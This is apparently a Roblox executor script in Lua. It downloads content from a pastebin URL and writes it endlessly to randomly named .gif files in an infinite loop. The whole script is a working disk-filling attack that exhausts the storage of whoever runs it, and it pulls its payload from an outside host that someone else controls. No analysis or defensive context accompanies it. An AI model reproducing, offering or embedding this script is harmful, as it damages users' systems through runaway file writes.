local ment = game:HttpGet("https://pastebin.com/raw/gDePQbMR")


local random = Random.new()
local letters = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'}

function getRandomLetter()
    return letters[random:NextInteger(1,#letters)]
end

function getRandomString(length, includeCapitals)
    local length = length or 10
    local str = ''
    for i=1,length do
        local randomLetter = getRandomLetter()
        if includeCapitals and random:NextNumber() > .5 then
            randomLetter = string.upper(randomLetter)
        end
        str = str .. randomLetter
    end
    return str
end

while true do
    writefile(getRandomString(7, true)..".gif", ment)
end